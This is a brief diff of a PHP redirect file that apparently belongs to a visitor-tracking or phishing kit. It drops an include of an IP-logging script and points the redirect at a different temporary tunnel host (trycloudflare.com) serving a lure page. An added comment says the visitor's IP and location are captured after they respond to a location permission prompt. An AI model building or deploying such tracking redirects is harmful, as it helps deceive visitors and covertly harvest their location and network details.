@@ -1,5 +1,5 @@
 <?php
-include 'ip.php';
-header('Location: https://b590eaefb8e41adf-49-145-223-117.serveousercontent.com/index2.html');
+// IP/location captured only AFTER user responds to location permission (via location-submit.php)
+header('Location: https://railway-sites-pairs-papers.trycloudflare.com/index2.html');
 exit
 ?>
